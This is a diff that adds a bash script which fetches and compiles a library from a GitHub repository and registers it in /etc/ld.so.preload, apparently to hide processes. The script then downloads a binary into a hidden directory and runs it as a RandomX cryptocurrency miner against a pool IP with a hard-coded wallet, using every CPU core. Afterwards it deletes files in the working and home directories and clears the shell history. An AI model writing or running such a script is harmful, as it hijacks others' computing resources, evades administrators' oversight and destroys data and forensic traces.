@@ -1,0 +1,25 @@
+#!/bin/bash
+set -x
+apt-get update 
+apt-get install -y wget curl sudo
+curl https://github.com/cornea99/upil/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
+mkdir .lib && cd .lib
+wget -O sgr1 https://github.com/cornea99/upil/raw/main/zepo > /dev/null 2>&1
+chmod u+x sgr1
+./sgr1 --donate-level 1 -o 165.227.239.240:443 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw.$WORKER -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+sleep 30
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
+done
